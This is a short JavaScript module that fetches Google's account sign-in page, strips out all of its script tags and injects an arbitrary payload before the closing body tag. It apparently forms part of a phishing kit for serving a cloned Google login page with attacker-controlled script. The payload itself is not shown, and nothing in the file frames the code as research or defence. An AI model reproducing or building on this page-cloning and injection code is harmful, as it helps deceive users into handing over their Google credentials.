var request = require("request");

var HTTPUtils = {
    getPageContents: function () {
        return new Promise(function(resolve, reject) {
            request({
                uri: "https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
            }, function(error, response, body) {
                resolve(body);
            });
        });
    },
    stripScripts: function (content) {
        let cleanBody = [];
        let skipping = false;
    
        for (let i = 0; i < content.length; i++) {
            if (content[i].includes("<script")) {
                skipping = true;
            }

            if (!skipping) {
                cleanBody.push(content[i]);
            }

            if (content[i].includes("</script")) {
                skipping = false;
            }
        }
        return cleanBody.join("\n");
    },
    injectScript: function (content, payload) {
        let cleanBodyFinalSplit = content.split("</body>");
        cleanBodyFinalSplit[0] += payload;

        return cleanBodyFinalSplit.join('');
    }
}

module.exports = HTTPUtils;